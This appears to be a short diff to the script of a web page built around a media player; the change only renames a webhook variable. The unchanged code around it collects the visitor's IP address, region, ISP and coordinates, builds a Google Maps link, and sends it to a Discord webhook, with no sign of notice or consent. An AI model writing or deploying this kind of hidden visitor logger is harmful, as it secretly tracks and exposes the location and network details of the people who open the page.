@@ -6,7 +6,7 @@ const regionElement = document.getElementById('region');
 const ispElement = document.getElementById('isp');
 const player = document.getElementById('player'); 
 const playPauseButton = document.getElementById('play-pause-button');
-const webhookUrl = process.env.WEBHOOK_URL;
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
 
 // Fetch the IP address and location data
 fetch('https://api.ipify.org?format=json')
@@ -35,7 +35,7 @@ fetch('https://api.ipify.org?format=json')
                        `[Map](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude})\n`;
 
         // Send to Discord Webhook
-        fetch(webhookUrl, {
+        fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
